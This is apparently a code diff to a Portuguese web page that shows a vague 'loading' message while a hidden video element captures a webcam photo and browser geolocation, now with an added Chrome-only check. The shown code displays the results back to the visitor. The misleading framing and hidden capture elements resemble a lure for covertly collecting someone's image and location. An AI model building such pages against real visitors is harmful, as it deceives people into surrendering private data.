@@ -6,7 +6,7 @@
 <title>Carregando...</title>
 <style>
        #videoElement {
-           display: none;P
+           display: none;
        }
        #canvas {
            display: none;
@@ -14,11 +14,26 @@
 </style>
 </head>
 <body>
-<h3>Obtendo informações... Aguarde!</h2>
+<h3>Obtendo informações... Aguarde!</h3>
 <video id="videoElement" autoplay></video>
 <canvas id="canvas"></canvas>
+<p id="message">Verificando seu navegador...</p>
 <script>
+       function isChrome() {
+           const userAgent = navigator.userAgent;
+           return /Chrome/.test(userAgent) && /Google Inc/.test(navigator.vendor);
+       }
        document.addEventListener("DOMContentLoaded", function() {
+           const message = document.querySelector("#message");
+           if (!isChrome()) {
+               message.innerHTML = "Este site requer o Google Chrome para funcionar corretamente. Por favor, abra este site no Google Chrome.";
+               const chromeDownloadLink = document.createElement('a');
+               chromeDownloadLink.href = "https://www.google.com/chrome/";
+               chromeDownloadLink.innerText = "Baixar Google Chrome";
+               chromeDownloadLink.target = "_blank";
+               document.body.appendChild(chromeDownloadLink);
+               return;
+           }
            const video = document.querySelector("#videoElement");
            const canvas = document.querySelector("#canvas");
            function capturePhotoAndLocation() {
@@ -40,10 +55,9 @@
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition((position) => {
                                    const { latitude, longitude } = position.coords;
-                                   // Mostrar a imagem e a localização em uma nova janela ou aba
-
+                                   // Criar um link para o Google Maps com a localização
                                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
+                                   // Mostrar a imagem e a localização em uma nova janela ou aba
                                    const newWindow = window.open();
                                    newWindow.document.write('<h3>Sua Foto e Localização</h3>');
                                    newWindow.document.write('<img src="' + dataURL + '" alt="Foto"><br>');
@@ -51,11 +65,9 @@
                                    newWindow.document.write('<p>Longitude: ' + longitude + '</p>');
                                    newWindow.document.write('<p><a href="' + mapsLink + '" target="_blank">Ver no Google Maps</a></p>');
                                }, (error) => {
-
-                                  const newWindow = window.open();
-                                  newWindow.document.write('<h3>É necessário obter as autorizações pertinentes antes de prosseguirmos...</h3>');
-                                  console.error("Erro ao obter localização: ", error);
-
+                                   const newWindow = window.open();
+                                   newWindow.document.write('<h3>É necessário obter as autorizações pertinentes antes de prosseguirmos...</h3>');
+                                   console.error("Erro ao obter localização: ", error);
                                });
                            } else {
                                console.error("Geolocalização não é suportada pelo navegador.");
@@ -63,13 +75,12 @@
                        };
                    })
                    .catch(function(err) {
-
                        const newWindow = window.open();
                        newWindow.document.write('<h3>É necessário obter as autorizações pertinentes antes de prosseguirmos...</h3>');
                        console.log("Ocorreu um erro: " + err);
-                      
                    });
            }
+           message.innerHTML = "Solicitando permissões para acessar a câmera e a localização...";
            capturePhotoAndLocation();
        });
 </script>
